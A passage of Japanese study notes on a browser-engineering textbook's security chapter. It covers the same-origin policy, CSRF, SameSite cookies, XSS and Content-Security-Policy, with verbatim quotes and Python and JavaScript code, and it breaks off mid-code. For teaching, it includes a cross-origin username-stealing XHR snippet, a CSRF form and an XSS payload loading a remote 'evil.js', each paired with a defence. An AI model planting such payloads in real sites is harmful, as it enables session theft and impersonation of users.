- `XMLHttpRequest` の命名についての脚注（逐語）: 「It's a weird name! Why is `XML` capitalized but not `Http`? And it's not restricted to XML! Ultimately, the naming is [historical][xhr-history], dating back to Microsoft's "Outlook Web Access" feature for Exchange Server 2000.」（`https://en.wikipedia.org/wiki/XMLHttpRequest#History`）
- 本書は**同期版のみ**を実装する。脚注（逐語）: 「Synchronous `XMLHttpRequest`s are slowly moving through [deprecation and obsolescence][xhr-open], but I'm using them here because they are easier to implement. We'll implement the asynchronous variant in Chapter 12.」（`https://xhr.spec.whatwg.org/#the-open()-method`）
- **`XMLHttpRequest` の意義（逐語）**: 「With `XMLHttpRequest`, a web page can make HTTP requests in response to user actions, making websites more interactive. This API, and newer analogs like [`fetch`][mdn-fetch], are how websites allow you to **like a post, see hover previews, or submit a form without reloading**.」（Figure 2: single-page application のアーキテクチャ、`im/security-spa-2.gif`）
- **further ボックス（禁止ヘッダ名、クライアントサイド診断で直接役立つ、逐語）**:
  > `XMLHttpRequest` objects have [`setRequestHeader`][xhr-srh] and [`getResponseHeader`][xhr-grh] methods to control HTTP headers. However, **this could allow a script to interfere with the cookie mechanism or with other security measures**, so some [request][bad-req-headers] and [response][bad-resp-headers] headers are not accessible from JavaScript.

| 参照名 | URL（逐語） |
| --- | --- |
| `xhr-grh` | `https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/getResponseHeader` |
| `xhr-srh` | `https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader` |
| `bad-req-headers` | `https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name` |
| `bad-resp-headers` | `https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_response_header_name` |
| `mdn-fetch` | `https://developer.mozilla.org/en-US/docs/Web/API/fetch` |

##### コード/コマンド（原文のまま逐語）

利用例:
``` {.javascript .example}
x = new XMLHttpRequest();
x.open("GET", url, false);
x.send();
// use x.responseText
```

``` {.javascript}
function XMLHttpRequest() {}

XMLHttpRequest.prototype.open = function(method, url, is_async) {
    if (is_async) throw Error("Asynchronous XHR is not supported");
    this.method = method;
    this.url = url;
}
```

``` {.javascript}
XMLHttpRequest.prototype.send = function(body) {
    this.responseText = call_python("XMLHttpRequest_send",
        this.method, this.url, body);
}
```

``` {.python replace=request(/request(self.tab.url%2c%20}
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        full_url = self.tab.url.resolve(url)
        headers, out = full_url.request(body)
        return out
```

（脚注: `method` 引数は無視される。`request` はpayloadが渡されたかどうかでメソッドを決めるため。これは標準に合致しない——標準はpayloadなしの `POST` を許す）

#### 5.5 Same-origin Policy 節

- **出発点（逐語）**: 「HTTP requests sent with `XMLHttpRequest` include cookies. This is by design: when you "like" something, the server needs to associate the "like" to your account. But it also means that `XMLHttpRequest` can access private data, and thus there is a need to protect it.」
- **具体的な攻撃シナリオ（ユーザ名の窃取）**: ログイン中のゲストブックはページに「Hello, so and so」とユーザ名を含む。だから**あなたのcookie付きでゲストブックを読めばユーザ名が判明する**。攻撃者のサイトから `XMLHttpRequest` でゲストブックを取得する。
- 「Why is the user on the attacker's site?」への脚注（逐語）: 「Perhaps it has funny memes, or it's been hacked and is being used for the attack against its will, or perhaps the evildoer paid for ads on sketchy websites where users have low standards for security anyway.」
- **問題の本質（逐語）**: 「The issue here is that **one server's web page content is being sent to a script running on a website delivered by another server**. Since the content is derived from cookies, this leaks private data.」
- **同一オリジンポリシーの定義（逐語）**:
  > To prevent issues like this, browsers have a [*same-origin policy*][same-origin-mdn], which says that requests like `XMLHttpRequest` can only go to web pages on the same "origin"---**scheme, hostname, and port**. This way, a website's private data has to stay on that website, and cannot be leaked to an attacker on another server.
  - `same-origin-mdn`: `https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy`
- **同一オリジンポリシーの適用範囲についての決定的な脚注（逐語、教科書必載）**:
  > Some kinds of request are **not** subject to the same-origin policy (most prominently **CSS and JavaScript files linked from a web page**); conversely, the same-origin policy also governs JavaScript interactions with **`iframe`s, images, `localStorage`** and many other browser features.
- **cookieの「サイト」とoriginの「サイト」は別物という脚注（逐語、実務で極めて重要）**:
  > You may have noticed that this is not the same definition of "website" as cookies use: **cookies don't care about scheme or port!** This seems to be an oversight or incongruity left over from the messy early web.
- **further ボックス（canvas の taint、逐語）**:
  > One interesting form of the same-origin policy involves images and the HTML `<canvas>` element. The [`drawImage` method][mdn-drawimage] allows drawing an image to a canvas, even if that image was loaded from another origin. But to prevent that image from being read back with [`getImageData`][mdn-getimagedata] or related methods, writing cross-origin data to a canvas [taints][tainted] it, blocking read methods.
  - `mdn-drawimage`: `https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/drawImage`
  - `mdn-getimagedata`: `https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/getImageData`
  - `tainted`: `https://developer.mozilla.org/en-US/docs/Web/HTML/CORS_enabled_image`

##### コード/コマンド（原文のまま逐語）

攻撃コード（診断・検証目的の実証例）:
``` {.javascript .example}
x = new XMLHttpRequest();
x.open("GET", "http://localhost:8000/", false);
x.send();
user = x.responseText.split(" ")[2].split("<")[0];
```

防御実装:
``` {.python}
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        # ...
        if full_url.origin() != self.tab.url.origin():
            raise Exception("Cross-origin XHR request not allowed")
        # ...
```

``` {.python}
class URL:
    def origin(self):
        return self.scheme + "://" + self.host + ":" + str(self.port)
```

#### 5.6 Cross-site Request Forgery（CSRF）節

- **前提（逐語）**: 「The same-origin policy prevents cross-origin `XMLHttpRequest` calls. But **the same-origin policy doesn't apply to normal browser actions like clicking a link or filling out a form**. This enables an exploit called *cross-site request forgery*, often shortened to CSRF.」
- 攻撃の構造: 攻撃者のサイトに置いたフォームがゲストブックに submit する。フォームが攻撃者のサイト上にあっても、submit すればブラウザは**ゲストブックへのHTTPリクエストを出し、ゲストブックのcookieを送る**ので、ログイン状態になり、サーバは投稿を許す。
- **ユーザが気づけない理由（逐語）**: 「the user has no way of knowing which server a form submits to---the attacker's web page could have misrepresented that---so they may have posted something they didn't mean to.」
- **攻撃の偽装についての脚注（逐語）**:
  > Even worse, the form submission could be **triggered by JavaScript, with the user not involved at all**. And this kind of attack can be further disguised by **hiding the entry widget, pre-filling the post, and styling the button to look like a normal link**.
- **被害の性質（逐語）**: 「Of course, the attacker can't read the response, so this doesn't leak private data to the attacker. But it can allow the attacker to _act_ as the user! Posting a comment this way is not too scary (though shady advertisers will pay for it!) but **posting a bank transaction is**. And if the website has a **change-of-password form**, there could even be a way to take control of the account.」
- **なぜフォーム送信に同一オリジンポリシーを適用できないか（逐語の脚注）**: 「For example, many search forms on websites submit to Google, because those websites don't have their own search engines.」
- **サーバ側の定石＝nonce（逐語）**:
  > The usual advice is to give a unique identity to every form the server serves, and make sure that every POST request comes from one of them. The way to do that is to embed a secret value, called a *nonce*, into the form, and to reject form submissions that don't come with the right secret value. **You can only get a nonce from the server, and the nonce is tied to the user session**, so the attacker could not embed it in their form.
  - **nonceはユーザに紐づけなければならない（逐語の脚注）**: 「It's important that nonces are associated with the particular user. Otherwise, **the attacker can generate a nonce for *themselves* and insert it into a form meant for the *user***.」
  - **nonceもXSSで盗める（逐語の脚注）**: 「Note the similarity to cookies, except that instead of granting identity to browsers, we grant one to forms. **Like a cookie, a nonce can be stolen with cross-site scripting.**」
  - **実運用上の注意（逐語の脚注）**: 「In real websites it's usually best to allow one user to have **multiple active nonces**, so that a user can open two forms in two tabs without that overwriting the valid nonce. To prevent the nonce set from growing over time, you'd have **nonces expire** after a while.」
  - `<input type=hidden>` が通常は不可視だが本書のブラウザは未対応（脚注）。
- **サーバ側対策の限界（逐語）**: 「But **server-side solutions are fragile (what if you forget a form?)** and relying on every website out there to do it right is a pipe dream. It'd be better for the browser to provide a fail-safe backup.」
- **further ボックス（クリックジャッキング、逐語、教科書必載）**:
  > One unusual attack, similar in spirit to cross-site request forgery, is [click-jacking][clickjacking]. In this attack, **an external site in a transparent `iframe` is positioned over the attacker's site**. The user thinks they are clicking around one site, but they actually take actions on a different one. Nowadays, sites can prevent this with the [`frame-ancestors` directive][csp-frame-ancestors] to `Content-Security-Policy` or the older [`X-Frame-Options` header][x-frame-options].
  - `clickjacking`: `https://owasp.org/www-community/attacks/Clickjacking`
  - `x-frame-options`: `https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options`
  - `csp-frame-ancestors`: `https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors`

##### コード/コマンド（原文のまま逐語）

CSRF攻撃フォーム（診断・検証目的の実証例）:
``` {.html .example}
<form action="http://localhost:8000/add" method=post>
  <p><input name=guest></p>
  <p><button>Sign the book!</button></p>
</form>
```

nonce の発行:
``` {.python file=server}
def show_comments(session):
    # ...
    if "user" in session:
        nonce = str(random.random())[2:]
        session["nonce"] = nonce
        # ...
        out +=   "<input name=nonce type=hidden value=" + nonce + ">"
```

nonce の検証:
``` {.python file=server}
def add_entry(session, params):
    if "nonce" not in session or "nonce" not in params: return
    if session["nonce"] != params["nonce"]: return
    # ...
```

#### 5.7 SameSite Cookies 節

- **アイデア（逐語）**: 「For form submissions, that fail-safe solution is `SameSite` cookies. The idea is that **if a server marks its cookies `SameSite`, the browser will not send them in cross-site form submissions**.」
- **仕様の状況についての脚注（逐語）**: 「At the time of writing the `SameSite` cookie standard is still in a draft stage, and not all browsers implement that draft fully. So it's possible that this section may become out of date, though some kind of `SameSite` cookies will probably be ratified. The [MDN page][mdn-samesite] is helpful for checking the current status of `SameSite` cookies.」
  - `mdn-samesite`: `https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite`
- **`SameSite` の値と本書の実装範囲（逐語）**:
  > The `SameSite` attribute can take the value `Lax`, `Strict`, or `None`, and as I write, browsers have and plan different defaults. **Our browser will implement only `Lax` and `None`, and default to `None`.** When `SameSite` is set to `Lax`, **the cookie is not sent on cross-site `POST` requests, but is sent on same-site `POST` or cross-site `GET` requests**.
- **`Lax` がクロスサイト`GET`を許す理由（逐語の脚注）**: 「Cross-site `GET` requests are also known as "clicking a link", which is why those are allowed in `Lax` mode. The `Strict` version of `SameSite` blocks these too, but you need to design your web application carefully for this to work.」

##### SameSite の挙動まとめ表（原文の記述から構成）

| リクエストの種類 | `SameSite=Lax` | `SameSite=None`（本書のデフォルト） | `Strict`（本書未実装） |
| --- | --- | --- | --- |
| same-site `GET` | 送る | 送る | 送る |
| same-site `POST` | 送る | 送る | 送る |
| **cross-site `GET`**（リンククリック） | **送る** | 送る | ブロックされる（原文: "The `Strict` version of `SameSite` blocks these too"） |
| **cross-site `POST`**（CSRFの主経路） | **送らない** | 送る | 送らない |

- **"referrer" vs "top-level site" の差異（逐語の脚注、重要）**:
  > The "referrer" is the web page that "referred" our browser to make the current request. `SameSite` cookies are actually supposed to [use the "top-level site"][samesite-def], **not the referrer**, to determine if the cookies should be sent, but the differences are subtle and I'm skipping them for simplicity.
  - `samesite-def`: `https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-cookie-same-site-00#section-2.1`
- **「同一サイト」判定のブラウザ差（逐語の脚注、クライアントサイド診断で必須の知識）**:
  > As I write this, **some browsers also check that the new URL and the top-level URL have the same scheme** and **some browsers ignore subdomains, so that `www.foo.com` and `login.foo.com` are considered the "same site"**. If cookies were invented today, they'd probably be specific to URL origins (in fact, there is [an effort to do just that][origin-bound-cookies]), much like content security policies, but alas historical contingencies and backward compatibility force rules that are more complex but easier to deploy.
  - `origin-bound-cookies`: `https://github.com/sbingler/Origin-Bound-Cookies`
- **top-level URL をどう決めるか（本書の設計、逐語）**:
  - `Tab.load` の先頭: `self.url`（遷移元ページのURL）が referrer。**`self.url` が変更される前に呼ばなければならない**。
  - スクリプト・スタイルシートの読み込み: referrer は**新しく読み込むページのURL（`url`）**。理由（逐語）: 「That's because it is the new page that made us request these particular styles and scripts, so it defines which of those resources are on the same site.」
  - `XMLHttpRequest`: referrer は `self.tab.url`。
  - **新しいタブで最初のページを読むときは referrer が無い**ので `if referrer and ...` のチェックが必要。
- **further ボックス（Webの後付けパッチ性とブラウザ差、逐語、教科書必載）**:
  > The web was not initially designed around security, which has led to some [awkward patches][patches] after the fact. These patches may be ugly, but a dedication to backward compatibility is a strength of the web, and at least newer APIs can be designed around more consistent policies.
  >
  > To this end, while there is a full specification for `SameSite`, it is still the case that **real browsers support different subsets of the feature or different defaults. For example, Chrome defaults to `Lax`, but Firefox and Safari do not.** Likewise, **Chrome uses the scheme (`https` or `http`) as part of the definition of a "site"** (This is called "schemeful same-site."), but other browsers may not. The main reason for this situation is the need to maintain backward compatibility with existing websites.
  - `patches`: `https://jakearchibald.com/2021/cors/`
- **`SameSite` の位置づけ（逐語）**: 「`SameSite` provides a kind of **"defense in depth"**, a fail-safe that makes sure that even if we forgot a nonce somewhere, we're still secure against CSRF attacks. But **don't remove the nonces we added earlier!** They're important for **older browsers** and are **more flexible in cases like multiple domains**.」

##### コード/コマンド（原文のまま逐語）

ヘッダの例:
``` {.example}
Set-Cookie: foo=bar; SameSite=Lax
```

`Set-Cookie` のパラメータ解析（cookie jar を (値, パラメータ) のペアに変更）:
``` {.python indent=4 replace=(self/(self%2c%20referrer}
def request(self, payload=None):
    if "set-cookie" in response_headers:
        cookie = response_headers["set-cookie"]
        params = {}
        if ";" in cookie:
            cookie, rest = cookie.split(";", 1)
            for param in rest.split(";"):
                if '=' in param:
                    param, value = param.split("=", 1)
                else:
                    value = "true"
                params[param.strip().casefold()] = value.casefold()
        COOKIE_JAR[self.host] = (cookie, params)
```

送信時はパラメータを送らず値のみ送る:
``` {.python indent=4 replace=(self/(self%2c%20referrer}
def request(self, payload=None):
    if self.host in COOKIE_JAR:
        cookie, params = COOKIE_JAR[self.host]
        request += "Cookie: {}\r\n".format(cookie)
```

`referrer` 引数の追加:
``` {.python}
class URL:
    def request(self, referrer, payload=None):
        # ...
```

``` {.python}
class Tab:
    def load(self, url, payload=None):
        headers, body = url.request(self.url, payload)
        # ...
```

``` {.python}
class Tab:
    def load(self, url, payload=None):
        # ...
        for script in scripts:
            # ...
            try:
                header, body = script_url.request(url)
            except:
                continue
            # ...
        # ...
        for link in links:
            # ...
            try:
                header, body = style_url.request(url)
            except:
                continue
            # ...
        # ...
```

``` {.python}
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        # ...
        headers, out = full_url.request(self.tab.url, body)
        # ...
```

**SameSite 判定の核心コード（逐語）**:
``` {.python indent=4}
def request(self, referrer, payload=None):
    if self.host in COOKIE_JAR:
        # ...
        cookie, params = COOKIE_JAR[self.host]
        allow_cookie = True
        if referrer and params.get("samesite", "none") == "lax":
            if method != "GET":
                allow_cookie = self.host == referrer.host
        if allow_cookie:
            request += "Cookie: {}\r\n".format(cookie)
        # ...
```

サーバ側で `SameSite=Lax` を付ける:
``` {.python file=server}
def handle_connection(conx):
    if "cookie" not in headers:
        template = "Set-Cookie: token={}; SameSite=Lax\r\n"
        response += template.format(token)
```

> 〔本ノート筆者の観察（原典コードに基づく）〕`params[param.strip().casefold()] = value.casefold()` によりパラメータ名も値も casefold される。ゆえに `SameSite=Lax` は `params["samesite"] == "lax"` になり、判定 `params.get("samesite", "none") == "lax"` が成立する。また判定は `self.host == referrer.host` の **ホスト名完全一致のみ**で、scheme も port も、サブドメインの親子関係も見ていない（＝上記の脚注が指摘するブラウザ差の簡略版）。

#### 5.8 Cross-site Scripting（XSS）節

- **導入（逐語）**: 「Now other websites can't misuse our browser's cookies to read or write private data. This seems secure! But what about *our own* website? **With cookies accessible from JavaScript, any scripts run on our browser could, in principle, read the cookie value.** This might seem benign---doesn't our browser only run `comment.js`? But in fact...」
- 「**A web service needs to defend itself from being *misused*.**」ゲストブックのエントリ出力コードは `entry` を無加工で連結している。`entry` はユーザがコメントフォームに入れた任意の内容＝**HTMLタグ、カスタム `<script>` タグを含みうる**。
- **攻撃の帰結（逐語）**: 「Every user's browser would then download and run the `evil.js` script, which can send the cookies to the attacker. The attacker could then **impersonate other users, posting as them or misusing any other capabilities those users had**.」
- **cookie窃取の具体手段に関する脚注（逐語、教科書必載）**:
  > A site's cookies and cookie parameters are available to scripts running on that site through the [`document.cookie`][mdn-doc-cookie] API. See Exercise 10-5 for more details on how web servers can *opt in* to allowing cross-origin requests. **To steal cookies, it's the attacker's server that would to opt in to receiving stolen cookies.** Or, in a real browser, `evil.js` could **add images or scripts to the page to trigger additional requests**. In our limited browser the attack has to be a little clunkier, but the evil script can still, for example, **replace the whole page with a link that goes to their site and includes the token value in the URL**. You've seen "please click to continue" screens and have clicked through unthinkingly; your users will too.
  - `mdn-doc-cookie`: `https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie`
- **問題の本質（逐語、教科書の核となる一文）**:
  > The core problem here is that **user comments are supposed to be data, but the browser is interpreting them as code**. In web applications, this kind of exploit is usually called *cross-site scripting* (often written "XSS"), though **misinterpreting data as code is a common security issue in all kinds of programs**.
- **標準的な修正（逐語）**: 「The standard fix is to **encode the data so that it can't be interpreted as code**. For example, in HTML, you can write `&lt;` to display a less-than sign. Python has an `html` module for this kind of encoding」。
- **エスケープだけでは足りない理由（逐語）**: 「This is a good fix, and every application should be careful to do this escaping. But **if you forget to encode any text anywhere---that's a security bug. So browsers provide additional layers of defense.**」
- **further ボックス（CSSインジェクション / JSON hijacking / CORB、逐語、教科書必載）**:
  > Since the CSS parser we implemented in Chapter 6 is very permissive, **some HTML pages also parse as valid CSS**. This leads to an attack: **include an external HTML page as a style sheet and observe the styling it applies**. A [similar attack][json-hijack] involves **including external JSON files as scripts**. Setting a `Content-Type` header can prevent this sort of attack thanks to browsers' [Cross-Origin Read Blocking][corb] policy.
  - `corb`: `https://chromium.googlesource.com/chromium/src/+/refs/heads/main/services/network/cross_origin_read_blocking_explainer.md`
  - `json-hijack`: `https://owasp.org/www-pdf-archive/OWASPLondon20161124_JSON_Hijacking_Gareth_Heyes.pdf`

##### コード/コマンド（原文のまま逐語）

脆弱な出力:
``` {.python file=server indent=8 replace=entry/html.escape(entry),who/html.escape(who)}
out += "<p>" + entry + "\n"
out += "<i>by " + who + "</i></p>"
```

攻撃ペイロード（診断・検証目的の実証例）:
``` {.html .example}
Hi! <script src="http://my-server/evil.js"></script>
```

サーバが出力してしまうHTML:
``` {.html .output}
<p>Hi! <script src="http://my-server/evil.js"></script>
<i>by crashoverride</i></p>
```

修正（HTMLエスケープ）:
``` {.python file=server}
import html

def show_comments(session):
    # ...
    out += "<p>" + html.escape(entry) + "\n"
    out += "<i>by " + html.escape(who) + "</i></p>"
    # ...
```

#### 5.9 Content Security Policy 節

- **導入（逐語）**: 「One such layer is the `Content-Security-Policy` header. The full specification for this header is quite complex, but in the simplest case, the header is set to the keyword `default-src` followed by a **space-separated list of servers**」。
- **効果（逐語）**: 「This header asks the browser **not to load any resources (including CSS, JavaScript, images, and so on) except from the listed origins**. If our guest book used `Content-Security-Policy`, even if an attacker managed to get a `<script>` added to the page, the browser would refuse to load and run that script.」
- **実ブラウザのCSPはもっと複雑（逐語の脚注）**: 「In real browsers `Content-Security-Policy` can also list **scheme-generic URLs** and other sources like **`self`**. And there are **keywords other than `default-src`, to restrict styles, scripts, and `XMLHttpRequest`s each to their own set of URLs**.」
- **パースのタイミングが重要（逐語）**: 「This parsing needs to happen _before_ we request any JavaScript or CSS, because we now need to check whether those requests are allowed.」
- **相対URLの解決順（逐語）**: 「Note that we need to **first resolve relative URLs** to know if they're allowed.」
- **ブロック時の挙動の違い（逐語の脚注、診断上重要）**:
  > Note that when loading styles and scripts, our browser merely **ignores** blocked resources, while for blocked `XMLHttpRequest`s it **throws an exception**. That's because **exceptions in `XMLHttpRequest` calls can be caught and handled in JavaScript**.
- **動作確認の仕込み（逐語）**: ゲストブックに許可リスト外のスクリプトを要求させる → `<script src=https://example.com/evil.js></script>`。「If you've got everything implemented correctly, the browser should block the evil script and report so in the console.」脚注: 「Needless to say, `example.com` does not actually host an `evil.js` file, and any request to it returns "404 Not Found".」
- **章の結論（逐語）**: 「So are we done? Is the guest book totally secure? Uh ... no. There's more---much, *much* more---to web application security than what's in this book. ... Let's settle for this fact: **the guest book is more secure than before**.」
- **further ボックス（CSPの段階的導入、逐語、教科書必載）**:
  > On a complicated site, deploying `Content-Security-Policy` can accidentally break something. For this reason, browsers can automatically **report `Content-Security-Policy` violations to the server, using the [`report-to` directive][report-to]**. The [`Content-Security-Policy-Report-Only`][report-only] header asks the browser to **report violations of the content security policy *without* actually blocking the requests**.
  - `report-to`: `https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to`
  - `report-only`: `https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only`

##### コード/コマンド（原文のまま逐語）

ヘッダの例:
``` {.example}
Content-Security-Policy: default-src http://example.org
```

``` {.python}
class URL:
    def request(self, referrer, payload=None):
        # ...
        return response_headers, content
```

CSPのパース:
``` {.python}
class Tab:
    def load(self, url, payload=None):
        # ...
        self.allowed_origins = None
        if "content-security-policy" in headers:
            csp = headers["content-security-policy"].split()
            if len(csp) > 0 and csp[0] == "default-src":
                self.allowed_origins = []
                for origin in csp[1:]:
                    self.allowed_origins.append(URL(origin).origin())
        # ...
```

スクリプト読み込み時のチェック:
``` {.python}
class Tab:
    def load(self, url, payload=None):
        # ...
        for script in scripts:
            script_url = url.resolve(script)
            if not self.allowed_request(script_url):
                print("Blocked script", script, "due to CSP")
                continue
            # ...
```

`XMLHttpRequest` のチェック:
``` {.python}
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        full_url = self.tab.url.resolve(url)
        if not self.tab.allowed_request(full_url):
            raise Exception("Cross-origin XHR blocked by CSP")
        # ...
```

判定関数:
``` {.python}
class Tab:
    def allowed_request(self, url):
        return self.allowed_origins == None or \
            url.origin() in self.allowed_origins
```

サーバがCSPを送る:
``` {.python file=server}
def handle_connection(conx):
    # ...
    csp = "default-src http://localhost:8000"
    response += "Content-Security-Policy: {}\r\n".format(csp)
    # ...
```

検証用の違反スクリプト:
``` {.python file=server}
def show_comments(session):
    # ...
    out += "<script src=https://example.com/evil.js></script>"
    # ...
```

#### 5.10 Summary 節（逐語）

> We've added user data, in the form of cookies, to our browser, and immediately had to bear the heavy burden of securing that data and ensuring it was not misused. That involved:
>
> - mitigating cross-site `XMLHttpRequest`s with **the same-origin policy**;
> - mitigating cross-site request forgery with **nonces** and with **`SameSite` cookies**;
> - mitigating cross-site scripting with **escaping** and with **`Content-Security-Policy`**.
>
> We've also seen the more general lesson that **every increase in the capabilities of a web browser also leads to an increase in its responsibility to safeguard user data. Security is an ever-present consideration throughout the design of a web browser.**

**章末のwarningボックス（逐語）**:
> The purpose of this book is to teach the *internals of web browsers*, not to teach web application security. There's much more you'd want to do to make this guest book truly secure, let alone what we'd need to do to avoid **denial of service attacks** or to handle **spam and malicious use**. Please consult other sources before working on security-critical code.

#### 5.11 Outline 節（逐語のコマンド）

章末の「Outline」節は、その章時点のブラウザ／サーバの全関数・クラス・メソッド一覧を自動生成する。生成コマンドは原文中にそのまま書かれている:

``` 
python3 infra/outlines.py --html src/lab10.py --template book/outline.txt
```
```
python3 infra/outlines.py src/lab10.py --template book/outline.txt
```
```
python3 infra/outlines.py --html src/server10.py
```

#### 5.12 Exercises（演習）— 全6問を逐語で

- **10-1 *New inputs*.** Add support for hidden and password input elements. Hidden inputs shouldn't show up or take up space, while password input elements should show their contents as stars instead of characters.
- **10-2 *Certificate errors*.** When accessing an HTTPS page, the web server can send an invalid certificate ([`badssl.com`](https://badssl.com) hosts various invalid certificates you can use for testing). In this case, the `wrap_socket` function will raise a certificate error; catch these errors and show a warning message to the user. For all *other* HTTPS pages draw a padlock (spelled `\N{lock}`) in the address bar.
- **10-3 *Script access*.** Implement the [`document.cookie` JavaScript API][mdn-doc-cookie]. Reading this field should return a string containing the cookie value and parameters, formatted similarly to the `Cookie` header. Writing to this field updates the cookie value and parameters, just like receiving a `Set-Cookie` header does. Also implement the **`HttpOnly`** cookie parameter; cookies with this parameter [cannot be read or written][std-httponly] from JavaScript.
  - `std-httponly`: `https://datatracker.ietf.org/doc/html/rfc6265#section-5.3`
- **10-4 *Cookie expiration*.** Add support for cookie expiration. Cookie expiration dates are set in the `Set-Cookie` header, and can be overwritten if the same cookie is set again with a later date. On the server side, save the expiration date in the `SESSIONS` variable and use it to delete old sessions to save memory.
- **10-5 *Cross-origin resource sharing (CORS)*.** Web servers can [*opt in*][cors] to allowing cross-origin `XMLHttpRequest`s. **The way it works is that on cross-origin HTTP requests, the browser makes the request and includes an `Origin` header with the origin of the requesting site; this request includes cookies for the target origin. To satisfy the same-origin policy, the browser then throws away the response. But the server can send the `Access-Control-Allow-Origin` header, and if its value is either the requesting origin or the special `*` value, the browser returns the response to the script instead.** All requests made by your browser will be what the CORS standard calls "simple requests".
  - `cors`: `https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS`
- **10-6 *`Referer`*.** When your browser visits a web page, or when it loads a CSS or JavaScript file, it sends a `Referer` header containing the URL it is coming from. Sites often use this for analytics. Implement this in your browser. However, **some URLs contain personal data that they don't want revealed to other websites**, so browsers support a `Referrer-Policy` header, which can contain values like **`no-referrer`** (never send the `Referer` header when leaving this page) or **`same-origin`** (only do so if navigating to another page on the same origin). Implement those two values for `Referrer-Policy`.
  - 脚注（逐語）: 「Yep, [spelled that way][wiki-typo].」 → `https://en.wikipedia.org/wiki/HTTP_referer#Etymology`（`Referer` は綴りミスがそのまま仕様になった）

### 6. 第10章時点の完成コード（出典: `src/lab10.py` / `src/server10.py` / `src/runtime10.js`、すべて逐語）

#### `src/lab10.py`（セキュリティ関連の全パッチ、逐語）

``` python
@wbetools.patch(URL)
class URL:
    def request(self, referrer, payload=None):
        s = socket.socket(
            family=socket.AF_INET,
            type=socket.SOCK_STREAM,
            proto=socket.IPPROTO_TCP,
        )
        s.connect((self.host, self.port))
    
        if self.scheme == "https":
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=self.host)
    
        method = "POST" if payload else "GET"
        request = "{} {} HTTP/1.0\r\n".format(method, self.path)
        request += "Host: {}\r\n".format(self.host)
        if self.host in COOKIE_JAR:
            cookie, params = COOKIE_JAR[self.host]
            allow_cookie = True
            if referrer and params.get("samesite", "none") == "lax":
                if method != "GET":
                    allow_cookie = self.host == referrer.host
            if allow_cookie:
                request += "Cookie: {}\r\n".format(cookie)
        if payload:
            content_length = len(payload.encode("utf8"))
            request += "Content-Length: {}\r\n".format(content_length)
        request += "\r\n"
        if payload: request += payload
        s.send(request.encode("utf8"))
        response = s.makefile("r", encoding="utf8", newline="\r\n")
    
        statusline = response.readline()
        version, status, explanation = statusline.split(" ", 2)
    
        response_headers = {}
        while True:
            line = response.readline()
            if line == "\r\n": break
            header, value = line.split(":", 1)
            response_headers[header.casefold()] = value.strip()
    
        if "set-cookie" in response_headers:
            cookie = response_headers["set-cookie"]
            params = {}
            if ";" in cookie:
                cookie, rest = cookie.split(";", 1)
                for param in rest.split(";"):
                    if '=' in param:
                        param, value = param.split("=", 1)
                    else:
                        value = "true"
                    params[param.strip().casefold()] = value.casefold()
            COOKIE_JAR[self.host] = (cookie, params)
    
        assert "transfer-encoding" not in response_headers
        assert "content-encoding" not in response_headers
    
        content = response.read()
        s.close()
    
        return response_headers, content

    def origin(self):
        return self.scheme + "://" + self.host + ":" + str(self.port)
        
COOKIE_JAR = {}
```

``` python
    def XMLHttpRequest_send(self, method, url, body):
        full_url = self.tab.url.resolve(url)
        if not self.tab.allowed_request(full_url):
            raise Exception("Cross-origin XHR blocked by CSP")
        headers, out = full_url.request(self.tab.url, body)
        if full_url.origin() != self.tab.url.origin():
            raise Exception("Cross-origin XHR request not allowed")
        return out
```

> 〔本ノート筆者の観察（原典コードに基づく、重要）〕**完成コードでは実行順が「CSPチェック → 実際にリクエスト送信（cookieも付く） → 同一オリジンチェック → 例外」になっている**。つまり同一オリジン違反でも**リクエストは実際に飛んでおりレスポンスだけ捨てられる**。これは本文の解説スニペット（チェックを先に書いていた）とは順序が異なるが、演習10-5がCORSについて述べる「the browser makes the request and includes an `Origin` header ... To satisfy the same-origin policy, the browser then throws away the response」という**実ブラウザの単純リクエストの挙動と一致している**。クライアントサイド診断では「同一オリジンポリシーはレスポンスの読み取りを止めるが、リクエストの送出自体は止めない（＝副作用は起きうる）」という点が本質であり、この実装はその性質を正確に写している。

``` python
@wbetools.patch(Tab)
class Tab:
    def allowed_request(self, url):
        return self.allowed_origins == None or \
            url.origin() in self.allowed_origins

    def load(self, url, payload=None):
        headers, body = url.request(self.url, payload)
        self.scroll = 0
        self.url = url
        self.history.append(url)

        self.allowed_origins = None
        if "content-security-policy" in headers:
           csp = headers["content-security-policy"].split()
           if len(csp) > 0 and csp[0] == "default-src":
                self.allowed_origins = []
                for origin in csp[1:]:
                    self.allowed_origins.append(URL(origin).origin())

        self.nodes = HTMLParser(body).parse()

        self.js = JSContext(self)
        scripts = [node.attributes["src"] for node
                   in tree_to_list(self.nodes, [])
                   if isinstance(node, Element)
                   and node.tag == "script"
                   and "src" in node.attributes]
        for script in scripts:
            script_url = url.resolve(script)
            if not self.allowed_request(script_url):
                print("Blocked script", script, "due to CSP")
                continue
            try:
                header, body = script_url.request(url)
            except:
                continue
            self.js.run(script, body)

        self.rules = DEFAULT_STYLE_SHEET.copy()
        links = [node.attributes["href"]
                 for node in tree_to_list(self.nodes, [])
                 if isinstance(node, Element)
                 and node.tag == "link"
                 and node.attributes.get("rel") == "stylesheet"
                 and "href" in node.attributes]
        for link in links:
            style_url = url.resolve(link)
            if not self.allowed_request(style_url):
